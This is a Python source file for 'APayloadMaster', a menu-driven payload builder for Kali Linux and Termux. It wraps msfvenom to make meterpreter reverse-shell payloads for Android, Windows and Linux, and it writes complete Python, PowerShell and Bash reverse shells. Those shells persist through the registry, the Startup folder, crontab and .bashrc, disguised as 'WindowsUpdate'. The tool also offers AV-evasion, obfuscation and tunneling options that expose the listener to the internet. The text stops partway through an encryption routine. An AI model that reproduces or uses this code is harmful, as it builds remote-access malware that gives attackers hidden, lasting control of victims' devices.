#!/usr/bin/env python3
"""
APayloadMaster - Complete Working Version
For Kali Linux & Termux
Author: mahi.cyberaware
"""

import os
import sys
import subprocess
import socket
import threading
import time
import json
import base64
import hashlib
import shutil
import tempfile
from datetime import datetime
import http.server
import socketserver
import urllib.parse
import urllib.request
import re
import zipfile
import tarfile
import getpass  # for hidden token input

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    PURPLE = '\033[95m'
    ENDC = '\033[0m'

class APayloadMaster:
    def __init__(self):
        self.colors = Colors()
        self.local_ip = self.get_local_ip()
        self.current_payload = None
        self.current_payload_type = None
        self.current_lhost = None
        self.current_lport = None
        self.current_connection_type = None
        self.current_payload_name = None
        self.ngrok_process = None
        self.http_server = None
        self.db_file = "payloads.db"
        self.pinggy_token = None
        self.pinggy_domain = None
        self.pinggy_server = "pro.pinggy.io"
        
        # Load Pinggy credentials if they exist
        self.load_pinggy_creds()
        
        # Create directories
        self.create_directories()
        
    def load_pinggy_creds(self):
        """Load Pinggy credentials from config file"""
        creds_file = "config/pinggy_creds.json"
        if os.path.exists(creds_file):
            try:
                with open(creds_file, 'r') as f:
                    creds = json.load(f)
                    self.pinggy_token = creds.get('token', '')
                    self.pinggy_domain = creds.get('domain', '')
                    self.pinggy_server = creds.get('server', 'pro.pinggy.io')
            except:
                pass

    def save_pinggy_creds(self, token, domain=None):
        """Save Pinggy credentials to config file"""
        creds_file = "config/pinggy_creds.json"
        data = {
            'token': token,
            'domain': domain if domain else '',
            'server': 'pro.pinggy.io'
        }
        try:
            os.makedirs('config', exist_ok=True)
            with open(creds_file, 'w') as f:
                json.dump(data, f, indent=4)
            self.pinggy_token = token
            self.pinggy_domain = domain
            print(f"{self.colors.GREEN}[+] Pinggy credentials saved.{self.colors.ENDC}")
        except Exception as e:
            print(f"{self.colors.RED}[!] Failed to save Pinggy credentials: {e}{self.colors.ENDC}")
    
    def get_local_ip(self):
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 1))
            ip = s.getsockname()[0]
        except Exception:
            ip = '127.0.0.1'
        finally:
            s.close()
        return ip
    
    def create_directories(self):
        """Create necessary directories"""
        dirs = [
            "output/payloads",
            "output/bound",
            "output/encrypted",
            "output/obfuscated",
            "server/uploads",
            "downloads",
            "logs",
            "tools",
            "config"
        ]
        for d in dirs:
            os.makedirs(d, exist_ok=True)
    
    def display_banner(self):
        """Display modern professional banner"""
        banner = f"""
{self.colors.PURPLE}
███╗   ███╗ █████╗ ██╗  ██╗██╗ ██████╗██╗   ██╗██████╗ ███████╗██████╗ 
████╗ ████║██╔══██╗██║  ██║██║██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗
██╔████╔██║███████║███████║██║██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝
██║╚██╔╝██║██╔══██║██╔══██║██║██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗
██║ ╚═╝ ██║██║  ██║██║  ██║██║╚██████╗   ██║   ██████╔╝███████╗██║  ██║
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝
{self.colors.ENDC}
{self.colors.RED}      ╔═══════════════════════════════════════════════════════╗
      ║        APayloadMaster - Professional Edition v3.1       ║
      ║              Advanced Security Assessment Tool          ║
      ╚═══════════════════════════════════════════════════════╝{self.colors.ENDC}

{self.colors.CYAN}┌─────────────────────────────────────────────────────────────────┐
│  Author: {self.colors.YELLOW}mahi.cyberaware{self.colors.CYAN}                                    │
│  Local IP: {self.colors.GREEN}{self.local_ip:<15}{self.colors.CYAN}                              │
│  Platform: {sys.platform:<10} Python: {sys.version_info.major}.{sys.version_info.minor}             │
└─────────────────────────────────────────────────────────────────┘{self.colors.ENDC}

{self.colors.YELLOW}⚠️  LEGAL NOTICE: FOR AUTHORIZED SECURITY TESTING ONLY ⚠️
{self.colors.ENDC}{self.colors.BLUE}
• Use only on systems you own or have explicit permission to test
• Compliance with local laws and regulations is mandatory
• Educational and authorized professional use only
{self.colors.ENDC}
"""
        print(banner)
    
    def check_dependencies(self):
        """Check if required tools are installed"""
        tools = {
            'msfvenom': 'Metasploit Framework',
            'apktool': 'APK Tool',
            'ngrok': 'Ngrok (optional)',
            'loclx': 'LocalXpose (optional)',
            'cloudflared': 'Cloudflare Tunnel (optional)',
            'ssh': 'SSH client (required for Serveo/Pinggy)',
            'upx': 'UPX packer (optional)',
            'steghide': 'Steghide (optional)',
            'zipalign': 'Zipalign (Android SDK)',
            'jarsigner': 'Jarsigner (Java)'
        }
        missing = []
        for tool, name in tools.items():
            if tool in ['ssh', 'upx', 'steghide']:
                continue
            if shutil.which(tool) is None:
                missing.append(name)
        return missing
    
    def check_apktool_version(self):
        """Check if apktool version is >= 2.9.2 (numeric comparison)"""
        try:
            result = subprocess.run(["apktool", "--version"], capture_output=True, text=True)
            if result.returncode == 0:
                version_str = result.stdout.strip().split('\n')[0]
                # Extract only digits and dots
                version_str = re.sub(r'[^0-9.]', '', version_str)
                parts = version_str.split('.')
                if len(parts) >= 2:
                    major = int(parts[0])
                    minor = int(parts[1])
                    patch = int(parts[2]) if len(parts) > 2 else 0
                    
                    if major > 2:
                        return True
                    if major == 2 and minor > 9:
                        return True
                    if major == 2 and minor == 9 and patch >= 2:
                        return True
                    
                    print(f"{self.colors.YELLOW}[!] apktool version {version_str} is outdated. Please upgrade to 2.9.2+{self.colors.ENDC}")
                    return False
            return False
        except Exception as e:
            print(f"{self.colors.RED}[!] Error checking apktool version: {e}{self.colors.ENDC}")
            return False
    
    # ===== TUNNEL SETUP (MANUAL COMMAND MODE) =====
    
    def download_tool(self, tool_name, url, target_name=None, archive=False):
        """Download a binary tool and place it in tools/"""
        if shutil.which(tool_name):
            return True
        print(f"{self.colors.YELLOW}[*] Downloading {tool_name}...{self.colors.ENDC}")
        try:
            tool_dir = os.path.join(os.getcwd(), "tools")
            os.makedirs(tool_dir, exist_ok=True)
            target = os.path.join(tool_dir, target_name or tool_name)
            urllib.request.urlretrieve(url, target)
            if archive:
                if target.endswith('.tgz') or target.endswith('.tar.gz'):
                    with tarfile.open(target, 'r:gz') as tar:
                        tar.extractall(tool_dir)
                    extracted = os.path.join(tool_dir, tool_name)
                    if os.path.exists(extracted):
                        os.chmod(extracted, 0o755)
                        target = extracted
                elif target.endswith('.zip'):
                    with zipfile.ZipFile(target, 'r') as zipf:
                        zipf.extractall(tool_dir)
                    extracted = os.path.join(tool_dir, tool_name)
                    if os.path.exists(extracted):
                        os.chmod(extracted, 0o755)
                        target = extracted
            else:
                os.chmod(target, 0o755)
            if os.geteuid() == 0:
                shutil.copy(target, f"/usr/local/bin/{tool_name}")
            else:
                print(f"{self.colors.YELLOW}[!] Not root, add {tool_dir} to PATH or symlink manually{self.colors.ENDC}")
            print(f"{self.colors.GREEN}[+] {tool_name} downloaded{self.colors.ENDC}")
            return True
        except Exception as e:
            print(f"{self.colors.RED}[!] Failed to download {tool_name}: {e}{self.colors.ENDC}")
            return False
    
    def setup_ngrok(self, lport, is_http=False):
        """Setup ngrok tunnel – print command and ask for URL."""
        if not self.download_tool("ngrok", "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz", "ngrok.tgz", archive=True):
            return None, None
        token = getpass.getpass(f"{self.colors.YELLOW}[?] Enter ngrok auth token (optional, input hidden): {self.colors.ENDC}")
        if token:
            print(f"{self.colors.CYAN}[*] Run: ngrok config add-authtoken {token}{self.colors.ENDC}")
        if is_http:
            print(f"{self.colors.CYAN}[*] Start ngrok HTTP tunnel in another terminal with: ngrok http {lport}{self.colors.ENDC}")
        else:
            print(f"{self.colors.CYAN}[*] Start ngrok TCP tunnel in another terminal with: ngrok tcp {lport}{self.colors.ENDC}")
        url = input(f"{self.colors.YELLOW}[?] After starting, enter the public URL (e.g., https://abc123.ngrok.io or 0.tcp.ngrok.io:12345): {self.colors.ENDC}")
        # Parse host and port
        if '://' in url:
            url = url.split('://')[1]
        if ':' in url:
            host, port = url.split(':', 1)
            return host, port
        else:
            # Assume it's a host with default port 443 for https or 80 for http
            return url, lport
    
    def setup_localxpose(self, lport, is_http=False):
        """Setup LocalXpose tunnel – print command and ask for URL."""
        if not self.download_tool("loclx", "https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip", "loclx.zip", archive=True):
            return None, None
        token = getpass.getpass(f"{self.colors.YELLOW}[?] Enter LocalXpose auth token (optional, input hidden): {self.colors.ENDC}")
        if token:
            print(f"{self.colors.CYAN}[*] Authenticate with: loclx account login --token {token}{self.colors.ENDC}")
        subdomain = input(f"{self.colors.YELLOW}[?] Enter custom subdomain (optional, press Enter for random): {self.colors.ENDC}").strip()
        if is_http:
            cmd = f"loclx tunnel http --to localhost:{lport}"
            if subdomain:
                cmd += f" --subdomain {subdomain}"
        else:
            cmd = f"loclx tunnel tcp --to localhost:{lport}"
            if subdomain:
                cmd += f" --subdomain {subdomain}"
        print(f"{self.colors.CYAN}[*] Start LocalXpose tunnel in another terminal with: {cmd}{self.colors.ENDC}")
        url = input(f"{self.colors.YELLOW}[?] After starting, enter the public URL (e.g., https://something.loclx.io or host:port): {self.colors.ENDC}")
        # Parse
        if '://' in url:
            url = url.split('://')[1]
        if ':' in url:
            host, port = url.split(':', 1)
            return host, port
        else:
            return url, lport
    
    def setup_cloudflare(self, lport):
        """Setup Cloudflare tunnel – print command and ask for URL."""
        if not self.download_tool("cloudflared", "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64", "cloudflared"):
            return None, None
        token = getpass.getpass(f"{self.colors.YELLOW}[?] Enter Cloudflare Tunnel token (optional, input hidden): {self.colors.ENDC}")
        if token:
            print(f"{self.colors.CYAN}[*] To use a named tunnel, you need to configure it separately. For quick tunnel, token not needed.{self.colors.ENDC}")
        print(f"{self.colors.CYAN}[*] Start Cloudflare tunnel in another terminal with: cloudflared tunnel --url http://localhost:{lport}{self.colors.ENDC}")
        url = input(f"{self.colors.YELLOW}[?] After starting, enter the public URL (e.g., https://random-name.trycloudflare.com): {self.colors.ENDC}")
        host = url.replace("https://", "").replace("http://", "").split("/")[0]
        return host, "443"  # Cloudflare always HTTPS on 443
    
    def setup_serveo(self, lport, is_http=False):
        """Setup Serveo tunnel – print command and ask for URL."""
        subdomain = input(f"{self.colors.YELLOW}[?] Enter subdomain (optional): {self.colors.ENDC}").strip()
        if is_http:
            remote = f"{subdomain}:80:localhost:{lport}" if subdomain else f"80:localhost:{lport}"
            cmd = f"ssh -R {remote} serveo.net"
        else:
            remote = f"{subdomain}:{lport}:localhost:{lport}" if subdomain else f"{lport}:localhost:{lport}"
            cmd = f"ssh -R {remote} serveo.net"
        print(f"{self.colors.CYAN}[*] Start Serveo tunnel in another terminal with: {cmd}{self.colors.ENDC}")
        url = input(f"{self.colors.YELLOW}[?] After starting, enter the public URL (e.g., subdomain.serveo.net or port.serveo.net): {self.colors.ENDC}")
        if ':' in url:
            host, port = url.split(':', 1)
            return host, port
        else:
            return url, lport
    
    def setup_pinggy(self, lport, is_http=False):
        """Setup Pinggy tunnel – print command and ask for URL."""
        print(f"{self.colors.CYAN}[PINGGY]{self.colors.ENDC} SSH tunnel.")

        # If token not already configured, ask user preference
        if not self.pinggy_token:
            print("\nPinggy offers a free (random URL) and a Pro version (custom subdomain, persistent).")
            choice = input(f"{self.colors.YELLOW}[?] Use Pinggy Pro? (y/n, default n): {self.colors.ENDC}").lower()
            if choice == 'y':
                token = getpass.getpass(f"{self.colors.YELLOW}[?] Enter your Pinggy Pro token (input hidden): {self.colors.ENDC}").strip()
                if token:
                    domain = input(f"{self.colors.YELLOW}[?] Enter your custom domain (e.g., myname.pinggy.link) [optional]: {self.colors.ENDC}").strip()
                    self.save_pinggy_creds(token, domain)
                    print(f"{self.colors.GREEN}[+] Pro token configured.{self.colors.ENDC}")
                else:
                    print(f"{self.colors.YELLOW}[!] No token provided, falling back to free mode.{self.colors.ENDC}")
            else:
                print(f"{self.colors.YELLOW}[*] Using free Pinggy mode.{self.colors.ENDC}")
        else:
            # Token exists, ask if they want to use Pro
            use_pro = input(f"{self.colors.YELLOW}[?] Use Pinggy Pro account? (y/n, default y): {self.colors.ENDC}").lower() != 'n'
            if not use_pro:
                print(f"{self.colors.YELLOW}[*] Switching to free mode for this session.{self.colors.ENDC}")
                self.pinggy_token = None  # temporarily ignore token

        # Build command
        if self.pinggy_token:
            if is_http:
                # HTTP Pro command with loop (as per user example)
                cmd = f"""while true; do 
 ssh -p 443 -R0:localhost:{lport} -R{self.pinggy_domain or 'yourdomain'}:0:localhost:{lport} -L4300:localhost:4300 -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -t {self.pinggy_token}+force+qr@pro.pinggy.io x:localServerTls:localhost ; 
 sleep 10; done"""
            else:
                # TCP Pro command
                cmd = f"""while true; do 
 ssh -p 443 -R0:localhost:{lport} -o StrictHostKeyChecking=no -o ServerAliveInterval=30 {self.pinggy_token}+force+tcp@pro.pinggy.io ; 
 sleep 10; done"""
        else:
            if is_http:
                subdomain = input(f"{self.colors.YELLOW}[?] Enter custom subdomain (optional, e.g., myname): {self.colors.ENDC}").strip()
                if subdomain:
                    cmd = f"ssh -p 443 -R {subdomain}:80:localhost:{lport} -o StrictHostKeyChecking=no a.pinggy.io"
                else:
                    cmd = f"ssh -p 443 -R 0:localhost:{lport} -o StrictHostKeyChecking=no a.pinggy.io"
            else:
                subdomain = input(f"{self.colors.YELLOW}[?] Enter custom subdomain (optional, e.g., myname): {self.colors.ENDC}").strip()
                if subdomain:
                    cmd = f"ssh -p 443 -R {subdomain}:{lport}:localhost:{lport} -o StrictHostKeyChecking=no a.pinggy.io"
                else:
                    cmd = f"ssh -p 443 -R 0:localhost:{lport} -o StrictHostKeyChecking=no a.pinggy.io tcp"

        print(f"{self.colors.CYAN}[*] Start Pinggy tunnel in another terminal with:{self.colors.ENDC}")
        print(cmd)
        url = input(f"{self.colors.YELLOW}[?] After starting, enter the public host (e.g., myname.a.pinggy.link or live.pinggy.io) and port if needed (format host:port): {self.colors.ENDC}")
        if ':' in url:
            host, port = url.split(':', 1)
            return host, port
        else:
            return url, lport
    
    # ===== PAYLOAD CREATION (using manual tunnel entry) =====
    
    def create_payload_menu(self):
        while True:
            print(f"\n{self.colors.GREEN}[PAYLOAD CREATION]{self.colors.ENDC}")
            print("="*50)
            print(f"{self.colors.CYAN}Connection Methods:{self.colors.ENDC}")
            print("1. Localhost (Direct connection)")
            print("2. Ngrok Port Forwarding")
            print("3. Serveo (SSH Port Forwarding)")
            print("4. LocalXpose")
            print("5. Pinggy")
            print("6. Cloudflare Tunnel")
            print("7. Custom LHOST (manual)")
            print("8. Back to Main Menu")
            
            choice = input(f"\n{self.colors.YELLOW}[?] Select connection method: {self.colors.ENDC}")
            if choice == "8":
                return
            
            lport = input(f"{self.colors.YELLOW}[?] Enter LPORT (default: 4444): {self.colors.ENDC}") or "4444"
            lhost = None
            conn_type = None
            
            if choice == "1":
                lhost = self.local_ip
                conn_type = "localhost"
                print(f"{self.colors.GREEN}[+] Using local IP: {lhost}{self.colors.ENDC}")
                self.payload_type_menu(lhost, lport, conn_type)
            elif choice == "2":
                host, port = self.setup_ngrok(lport, is_http=False)
                if host:
                    self.payload_type_menu(host, port, "ngrok")
            elif choice == "3":
                host, port = self.setup_serveo(lport, is_http=False)
                if host:
                    self.payload_type_menu(host, port, "serveo")
            elif choice == "4":
                host, port = self.setup_localxpose(lport, is_http=False)
                if host:
                    self.payload_type_menu(host, port, "localxpose")
            elif choice == "5":
                host, port = self.setup_pinggy(lport, is_http=False)
                if host:
                    self.payload_type_menu(host, port, "pinggy")
            elif choice == "6":
                host, port = self.setup_cloudflare(lport)
                if host:
                    self.payload_type_menu(host, port, "cloudflare")
            elif choice == "7":
                lhost = input(f"{self.colors.YELLOW}[?] Enter custom LHOST: {self.colors.ENDC}")
                conn_type = "custom"
                self.payload_type_menu(lhost, lport, conn_type)
    
    def payload_type_menu(self, lhost, lport, connection_type):
        print(f"\n{self.colors.CYAN}[PAYLOAD TYPE]{self.colors.ENDC}")
        print(f"Connection: {connection_type} | LHOST: {lhost} | LPORT: {lport}")
        print("-"*50)
        print("1. Android APK (Auto-permissions + Auto-start)")
        print("2. Windows EXE")
        print("3. Windows DLL")
        print("4. Linux ELF")
        print("5. Python Script")
        print("6. PowerShell Script")
        print("7. Bash Script")
        print("8. Back")
        
        choice = input(f"\n{self.colors.YELLOW}[?] Select payload type: {self.colors.ENDC}")
        if choice == "8":
            return
        
        self.current_lhost = lhost
        self.current_lport = lport
        self.current_connection_type = connection_type
        
        custom_name = input(f"{self.colors.YELLOW}[?] Enter output filename (leave blank for auto): {self.colors.ENDC}")
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        if custom_name:
            base_name = custom_name
        else:
            base_name = f"{self.get_payload_prefix(choice)}_{timestamp}"
        
        print(f"\n{self.colors.CYAN}[ADVANCED OPTIONS]{self.colors.ENDC}")
        encrypt = input(f"{self.colors.YELLOW}[?] Encrypt payload? (y/n): {self.colors.ENDC}").lower() == 'y'
        obfuscate = input(f"{self.colors.YELLOW}[?] Obfuscate payload? (y/n): {self.colors.ENDC}").lower() == 'y'
        evade_av = input(f"{self.colors.YELLOW}[?] Add AV evasion? (y/n): {self.colors.ENDC}").lower() == 'y'
        
        if choice == "1":
            payload_file = self.create_android_payload(lhost, lport, base_name, encrypt, obfuscate, evade_av)
            self.current_payload_type = "android"
        elif choice == "2":
            payload_file = self.create_windows_payload(lhost, lport, base_name, encrypt, obfuscate, evade_av)
            self.current_payload_type = "windows"
        elif choice == "3":
            payload_file = self.create_windows_dll_payload(lhost, lport, base_name, encrypt, obfuscate, evade_av)
            self.current_payload_type = "windows_dll"
        elif choice == "4":
            payload_file = self.create_linux_payload(lhost, lport, base_name, encrypt, obfuscate, evade_av)
            self.current_payload_type = "linux"
        elif choice == "5":
            payload_file = self.create_python_payload(lhost, lport, base_name, encrypt, obfuscate, evade_av)
            self.current_payload_type = "python"
        elif choice == "6":
            payload_file = self.create_powershell_payload(lhost, lport, base_name, encrypt, obfuscate, evade_av)
            self.current_payload_type = "powershell"
        elif choice == "7":
            payload_file = self.create_bash_payload(lhost, lport, base_name, encrypt, obfuscate, evade_av)
            self.current_payload_type = "bash"
        else:
            return
        
        if payload_file and os.path.exists(payload_file):
            self.current_payload = payload_file
            self.current_payload_name = os.path.basename(payload_file)
            print(f"{self.colors.GREEN}[+] Payload created: {payload_file}{self.colors.ENDC}")
            file_hash = self.calculate_hash(payload_file)
            print(f"{self.colors.CYAN}[*] SHA256: {file_hash}{self.colors.ENDC}")
            self.ask_start_listener()
            self.binding_menu()
    
    def get_payload_prefix(self, choice):
        prefixes = {
            "1": "android",
            "2": "windows",
            "3": "windows_dll",
            "4": "linux",
            "5": "python",
            "6": "powershell",
            "7": "bash"
        }
        return prefixes.get(choice, "payload")
    
    def resolve_host(self, hostname):
        """Try to resolve hostname to IP; return IP if success, else original hostname"""
        try:
            ip = socket.gethostbyname(hostname)
            print(f"{self.colors.GREEN}[+] Resolved {hostname} -> {ip}{self.colors.ENDC}")
            return ip
        except socket.gaierror:
            print(f"{self.colors.YELLOW}[!] Could not resolve {hostname}, using as-is (may cause issues){self.colors.ENDC}")
            return hostname
    
    def create_android_payload(self, lhost, lport, base_name, encrypt=False, obfuscate=False, evade_av=False):
        output_file = f"output/payloads/{base_name}.apk"
        print(f"{self.colors.CYAN}[*] Creating Android payload...{self.colors.ENDC}")
        
        # Try to resolve hostname to IP (msfvenom works better with IP)
        lhost_for_msf = self.resolve_host(lhost)
        
        try:
            cmd = [
                "msfvenom", "-p", "android/meterpreter/reverse_tcp",
                f"LHOST={lhost_for_msf}", f"LPORT={lport}",
                "-o", output_file
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            if result.returncode != 0:
                print(f"{self.colors.RED}[!] msfvenom error:{self.colors.ENDC}")
                print(result.stderr)
                # If resolution failed, ask user to enter IP manually
                if lhost_for_msf == lhost and not re.match(r'^\d+\.\d+\.\d+\.\d+$', lhost):
                    print(f"{self.colors.YELLOW}[*] The LHOST might need to be an IP address.{self.colors.ENDC}")
                    manual_ip = input(f"{self.colors.YELLOW}[?] Enter an IP address manually (or press Enter to abort): {self.colors.ENDC}")
                    if manual_ip and re.match(r'^\d+\.\d+\.\d+\.\d+$', manual_ip):
                        cmd = [
                            "msfvenom", "-p", "android/meterpreter/reverse_tcp",
                            f"LHOST={manual_ip}", f"LPORT={lport}",
                            "-o", output_file
                        ]
                        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
                        if result.returncode != 0:
                            print(f"{self.colors.RED}[!] Still failed: {result.stderr}{self.colors.ENDC}")
                            return None
                    else:
                        return None
                else:
                    return None
            
            self.enhance_android_apk(output_file)
            
            if encrypt:
                output_file = self.encrypt_payload(output_file, "AES")
            if obfuscate:
                output_file = self.obfuscate_payload(output_file, "medium")
            if evade_av:
                output_file = self.evade_av(output_file, "packer")
            return output_file
        except Exception as e:
            print(f"{self.colors.RED}[!] Error: {e}{self.colors.ENDC}")
            return None
    
    def create_windows_payload(self, lhost, lport, base_name, encrypt=False, obfuscate=False, evade_av=False):
        output_file = f"output/payloads/{base_name}.exe"
        print(f"{self.colors.CYAN}[*] Creating Windows payload...{self.colors.ENDC}")
        lhost_for_msf = self.resolve_host(lhost)
        try:
            cmd = [
                "msfvenom", "-p", "windows/meterpreter/reverse_tcp",
                f"LHOST={lhost_for_msf}", f"LPORT={lport}",
                "-f", "exe", "-o", output_file
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                if encrypt: output_file = self.encrypt_payload(output_file, "XOR")
                if obfuscate: output_file = self.obfuscate_payload(output_file, "high")
                if evade_av: output_file = self.evade_av(output_file, "upx")
                return output_file
            else:
                print(f"{self.colors.RED}[!] Error: {result.stderr}{self.colors.ENDC}")
                return None
        except Exception as e:
            print(f"{self.colors.RED}[!] Error: {e}{self.colors.ENDC}")
            return None
    
    def create_windows_dll_payload(self, lhost, lport, base_name, encrypt=False, obfuscate=False, evade_av=False):
        output_file = f"output/payloads/{base_name}.dll"
        print(f"{self.colors.CYAN}[*] Creating Windows DLL payload...{self.colors.ENDC}")
        lhost_for_msf = self.resolve_host(lhost)
        try:
            cmd = [
                "msfvenom", "-p", "windows/meterpreter/reverse_tcp",
                f"LHOST={lhost_for_msf}", f"LPORT={lport}",
                "-f", "dll", "-o", output_file
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                if encrypt: output_file = self.encrypt_payload(output_file, "XOR")
                if obfuscate: output_file = self.obfuscate_payload(output_file, "high")
                if evade_av: output_file = self.evade_av(output_file, "upx")
                return output_file
            else:
                print(f"{self.colors.RED}[!] Error: {result.stderr}{self.colors.ENDC}")
                return None
        except Exception as e:
            print(f"{self.colors.RED}[!] Error: {e}{self.colors.ENDC}")
            return None
    
    def create_linux_payload(self, lhost, lport, base_name, encrypt=False, obfuscate=False, evade_av=False):
        output_file = f"output/payloads/{base_name}.elf"
        print(f"{self.colors.CYAN}[*] Creating Linux payload...{self.colors.ENDC}")
        lhost_for_msf = self.resolve_host(lhost)
        try:
            arch = "x64" if sys.maxsize > 2**32 else "x86"
            payload = f"linux/{arch}/meterpreter/reverse_tcp"
            cmd = [
                "msfvenom", "-p", payload,
                f"LHOST={lhost_for_msf}", f"LPORT={lport}",
                "-f", "elf", "-o", output_file
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                if encrypt: output_file = self.encrypt_payload(output_file, "AES")
                if obfuscate: output_file = self.obfuscate_payload(output_file, "medium")
                if evade_av: output_file = self.evade_av(output_file, "packer")
                return output_file
            else:
                print(f"{self.colors.RED}[!] Error: {result.stderr}{self.colors.ENDC}")
                return None
        except Exception as e:
            print(f"{self.colors.RED}[!] Error: {e}{self.colors.ENDC}")
            return None
    
    def create_python_payload(self, lhost, lport, base_name, encrypt=False, obfuscate=False, evade_av=False):
        output_file = f"output/payloads/{base_name}.py"
        payload_code = f'''#!/usr/bin/env python3
# Auto-generated payload - {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
# Author: mahi.cyberaware
import socket, subprocess, os, sys, platform, threading, time, base64

LHOST = "{lhost}"
LPORT = {lport}

def auto_start():
    if platform.system().lower() == "windows":
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.argv[0])
            winreg.CloseKey(key)
        except: pass
    elif platform.system().lower() == "linux":
        try:
            with open(os.path.expanduser("~/.bashrc"), "a") as f:
                f.write(f"\\npython3 {sys.argv[0]} &\\n")
        except: pass

def reverse_shell():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(30)
            s.connect((LHOST, LPORT))
            info = f"Platform: {{platform.platform()}}\\nUser: {{os.getenv('USERNAME') or os.getenv('USER')}}\\n"
            s.send(info.encode())
            while True:
                try:
                    cmd = s.recv(4096).decode().strip()
                    if not cmd or cmd.lower() == "exit": break
                    if cmd.startswith("cd "):
                        os.chdir(cmd[3:])
                        output = f"Changed to: {{os.getcwd()}}"
                    else:
                        try:
                            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
                        except subprocess.CalledProcessError as e:
                            output = e.output.decode() if e.output else str(e)
                    s.send(output.encode())
                except socket.timeout:
                    s.send(b"[*] Still alive\\n")
                    continue
                except: break
            s.close()
        except: pass
        time.sleep(10)

if __name__ == "__main__":
    auto_start()
    reverse_shell()
'''
        with open(output_file, 'w') as f:
            f.write(payload_code)
        os.chmod(output_file, 0o755)
        if obfuscate:
            output_file = self.obfuscate_python_code(output_file)
        return output_file
    
    def create_powershell_payload(self, lhost, lport, base_name, encrypt=False, obfuscate=False, evade_av=False):
        output_file = f"output/payloads/{base_name}.ps1"
        payload_code = f'''# PowerShell Reverse Shell
$LHOST = "{lhost}"
$LPORT = {lport}
function Reverse-Shell {{
    while ($true) {{
        try {{
            $client = New-Object System.Net.Sockets.TcpClient($LHOST, $LPORT)
            $stream = $client.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $reader = New-Object System.IO.StreamReader($stream)
            $writer.WriteLine("PowerShell Reverse Shell | User: $env:USERNAME")
            $writer.Flush()
            while ($true) {{
                $cmd = $reader.ReadLine()
                if (-not $cmd -or $cmd -eq "exit") {{ break }}
                $output = Invoke-Expression $cmd 2>&1 | Out-String
                $writer.WriteLine($output)
                $writer.Flush()
            }}
            $reader.Close(); $writer.Close(); $client.Close()
        }} catch {{ Start-Sleep -Seconds 10 }}
    }}
}}
$persistencePath = "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.ps1"
if (Test-Path $persistencePath) {{
    Copy-Item $MyInvocation.MyCommand.Path -Destination $persistencePath -Force
}}
Reverse-Shell
'''
        with open(output_file, 'w') as f:
            f.write(payload_code)
        return output_file
    
    def create_bash_payload(self, lhost, lport, base_name, encrypt=False, obfuscate=False, evade_av=False):
        output_file = f"output/payloads/{base_name}.sh"
        payload_code = f'''#!/bin/bash
LHOST="{lhost}"
LPORT={lport}
add_persistence() {{
    (crontab -l 2>/dev/null; echo "@reboot /bin/bash {output_file}") | crontab -
    echo "nohup /bin/bash {output_file} > /dev/null 2>&1 &" >> ~/.bashrc
}}
reverse_shell() {{
    while true; do
        exec 5<>/dev/tcp/$LHOST/$LPORT 2>/dev/null
        if [ $? -eq 0 ]; then
            echo "Connected to $LHOST:$LPORT" >&5
            echo "User: $(whoami) | Host: $(hostname)" >&5
            while read -r cmd <&5; do
                [ -z "$cmd" ] && break
                [ "$cmd" = "exit" ] && exit 0
                eval "$cmd" >&5 2>&1
            done
            exec 5<&-; exec 5>&-
        fi
        sleep 10
    done
}}
add_persistence
reverse_shell
'''
        with open(output_file, 'w') as f:
            f.write(payload_code)
        os.chmod(output_file, 0o755)
        return output_file
    
    def enhance_android_apk(self, apk_path):
        try:
            script = f"""#!/bin/bash
echo "[*] Adding auto-permissions to APK..."
echo "To fully enhance APK, manually:"
echo "1. apktool d {apk_path} -o temp_apk"
echo "2. Edit AndroidManifest.xml to add permissions:"
echo "   - android.permission.INTERNET"
echo "   - android.permission.ACCESS_NETWORK_STATE"
echo "   - android.permission.RECEIVE_BOOT_COMPLETED"
echo "   - android.permission.WAKE_LOCK"
echo "3. apktool b temp_apk -o {apk_path}"
echo "4. jarsigner -keystore debug.keystore {apk_path} androiddebugkey"
"""
            script_path = f"enhance_{os.path.basename(apk_path)}.sh"
            with open(script_path, 'w') as f:
                f.write(script)
            os.chmod(script_path, 0o755)
            print(f"{self.colors.YELLOW}[*] Enhancement instructions saved to: {script_path}{self.colors.ENDC}")
        except Exception as e:
            print(f"{self.colors.RED}[!] Enhancement error: {e}{self.colors.ENDC}")
    
    def encrypt_payload(self, filepath, method="AES"):
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            if method == "AES":
                try:
                    from Crypto.Cipher import AES
                    from Crypto.Random import get_random_bytes
                    key = get_random_bytes(32)
                    cipher = AES.new(key, AES.MODE_EAX)
                    ciphertext, tag = cipher.encrypt_and_digest(data)
                    encrypted_file = filepath + ".enc"
                    with open(encrypted_file, 'wb') as f:
                        f.write(cipher.nonce + tag + ciphertext)
